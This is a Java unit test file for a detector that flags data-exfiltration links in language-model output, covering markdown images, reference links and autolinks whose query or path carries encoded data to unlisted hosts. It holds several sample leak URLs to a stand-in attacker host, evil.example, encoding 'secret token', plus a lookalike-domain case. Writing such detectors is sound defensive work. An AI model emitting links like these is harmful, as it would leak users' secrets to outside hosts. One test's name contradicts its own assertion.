package dev.llmfirewall.collector.detect.exfil;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

import dev.llmfirewall.collector.label.Direction;
import dev.llmfirewall.collector.label.Segment;
import dev.llmfirewall.collector.label.Source;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.Test;

class ExfilLinkDetectorTest {

    private static final ExfilLinkDetector DETECTOR = new ExfilLinkDetector(Set.of("Claude.AI", ".github.com"), 16);
    private static final String LEAK = "https://evil.example/p.png?d=c2VjcmV0IHRva2Vu";

    /** "subtype=url" for each hit. */
    private static List<String> hits(String text) {
        final Segment s = new Segment(Source.MODEL_OUTPUT, Direction.INBOUND, text, "resp:sse:block[0]");
        return DETECTOR.detect(s).stream().map(d -> d.subtype() + "=" + text.substring(d.start(), d.end())).toList();
    }

    @Test
    void flagsMarkdownImageWithQueryToUnlistedHost() {
        assertEquals(List.of("md_image_query=" + LEAK), hits("Here: ![chart](" + LEAK + " \"title\")"));
        assertEquals(List.of("md_link_query=" + LEAK), hits("See [the docs](<" + LEAK + ">)."));
    }

    @Test
    void flagsReferenceStyleAndAutolinks() {
        assertEquals(List.of("md_image_query=" + LEAK), hits("![logo][Img 1]\n\n  [img  1]: " + LEAK));
        assertEquals(List.of("md_link_query=" + LEAK), hits("[read more][r]\n[r]: <" + LEAK + ">"));
        assertEquals(List.of("autolink_query=" + LEAK, "autolink_query=" + LEAK), hits("Visit " + LEAK + ", or <" + LEAK + ">."));
    }

    @Test
    void flagsTheOuterLinkOfALinkedImageAsAnAutolink() {
        assertEquals(List.of("autolink_query=" + LEAK), hits("[![badge](/badge.svg)](" + LEAK + ")"));
    }

    @Test
    void ignoresAllowlistedDomainAndSubdomains() {
        assertEquals(List.of(), hits("![a](https://claude.ai/i.png?d=c2VjcmV0IHRva2Vu) "
                                     + "[b](https://raw.github.com/x?d=c2VjcmV0IHRva2Vu)"));
    }

    @Test
    void ignoresLookalikeOfAllowlistedDomain() {
        final String lookalike = "https://claude.ai.evil.example/i.png?d=c2VjcmV0IHRva2Vu";
        assertEquals(List.of("md_image_query=" + lookalike), hits("![a](" + lookalike + ")"));
    }

    @Test
    void ignoresShortQueriesAndRelativeTargets() {
        assertEquals(List.of(), hits("![a](https://evil.example/i.png?v=2) [b](/local?d=c2VjcmV0IHRva2Vu) "
                                     + "https://evil.example/?utm_source=claude.ai"));
    }

    @Test
    void flagsEncodedPathSegment() {
        final String url = "https://evil.example/c2VjcmV0X3Rva2VuPTEy/p.png";
        assertEquals(List.of("md_image_query=" + url), hits("![x](" + url + ")"));
    }

    @Test
    void rejectsANonPositiveMinimum() {
        assertThrows(IllegalArgumentException.class, () -> new ExfilLinkDetector(Set.of(), 0));
    }
}
